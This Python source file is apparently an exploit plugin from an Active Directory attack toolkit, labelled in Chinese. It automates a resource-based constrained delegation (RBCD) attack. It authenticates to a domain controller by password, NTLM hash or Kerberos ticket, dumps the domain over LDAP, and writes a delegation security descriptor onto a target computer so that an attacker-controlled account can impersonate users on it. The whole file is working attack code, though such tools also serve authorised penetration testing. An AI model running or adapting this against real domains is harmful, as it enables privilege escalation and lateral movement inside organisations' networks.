import argparse
from copy import copy

import ldap3
import ldapdomaindump
from impacket.examples.ntlmrelayx.attacks.ldapattack import LDAPAttack
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig

from plugins.AD import PluginAdExploitBase
from utils import output
from utils.consts import AllPluginTypes


class PluginADRBCD(PluginAdExploitBase):
    display = "基于资源的约束委派(RBCD)利用"
    alias = "rbcd"
    p_type = AllPluginTypes.Exploit

    def __init__(self):
        super().__init__()

    def reg_argument(self, parser: argparse.ArgumentParser):
        parser.description = self.display

        parser.add_argument("-d", "--domain", help="dc fqdn (dc01.test.lab)", required=True, dest="domain")
        parser.add_argument("--dc-ip", help="domain ip address", required=False, dest="dc_ip")

        parser.add_argument("--username", help="username", required=False, dest="username")
        parser.add_argument("--password", help="password", required=False, dest="password")
        parser.add_argument("--hash", help='NTLM hashes, format is LMHASH:NTHASH', required=False,
                            metavar="LMHASH:NTHASH", dest="hash")
        parser.add_argument("-k", "--ticket", default=False,action=argparse.BooleanOptionalAction,
                            help="Use Kerberos authenticaton (ccache ticket is in KRB5CCNAME, identity is not required)",
                            required=False, dest="ticket")

        parser.add_argument("-t", help="Target computer hostname where the attacker has write access to properties",
                            required=True, dest="target")
        parser.add_argument("-f",
                            help='(Fake) computer hostname which the attacker can control', required=True,
                            dest="fake_computer")

    def run_script(self, args) -> dict:
        """
        脚本入口函数
        :return: bool
        """
        result = copy(self.result)

        _domain_fqdn: str = args.domain
        _domain_name = ".".join(_domain_fqdn.split(".")[-2:])
        _dc_ip = args.dc_ip
        _username = args.username
        _password = args.password
        _hash = args.hash
        _target_hostname = args.target
        _fake_hostname = args.fake_computer
        _ticket = args.ticket

        attackeraccount = [f"{_domain_name}\\{_username}", _password]
        c = NTLMRelayxConfig()
        c.addcomputer = _fake_hostname
        c.target = _dc_ip

        if args.hash:
            # support only :NTHASH format (no LM)
            attackerpassword = ("aad3b435b51404eeaad3b435b51404ee:" + _hash.split(":")[1]).upper()
        else:
            attackerpassword = attackeraccount[1]

        output.info('Starting Resource Based Constrained Delegation Attack against {}$'.format(_target_hostname))

        output.info('Initializing LDAP connection to {}'.format(_dc_ip))
        # tls = ldap3.Tls(validate=ssl.CERT_NONE, version=ssl.PROTOCOL_TLSv1_2)
        serv = ldap3.Server(_dc_ip, tls=False, get_info=ldap3.ALL)
        if args.ticket:
            output.info('Using Kerberos authentication')
            conn = ldap3.Connection(serv, authentication=ldap3.SASL, sasl_mechanism=ldap3.KERBEROS)
        else:
            output.info('Using {} account with password ***'.format(attackeraccount[0]))
            conn = ldap3.Connection(serv, user=attackeraccount[0], password=attackerpassword, authentication=ldap3.NTLM)
        conn.bind()
        output.info('LDAP bind OK')

        output.info('Initializing domainDumper()')
        cnf = ldapdomaindump.domainDumpConfig()
        cnf.basepath = c.lootdir
        dd = ldapdomaindump.domainDumper(serv, conn, cnf)

        output.info('Initializing LDAPAttack()')
        la = LDAPAttack(c, conn, attackeraccount[0].replace('\\', '/'))

        output.info(
            'Writing SECURITY_DESCRIPTOR related to (fake) computer `{}` into msDS-AllowedToActOnBehalfOfOtherIdentity of target computer `{}`'.format(
                _fake_hostname, _target_hostname))
        la.delegateAttack(_fake_hostname + '$', _target_hostname + '$', dd, sid=None)

        return result
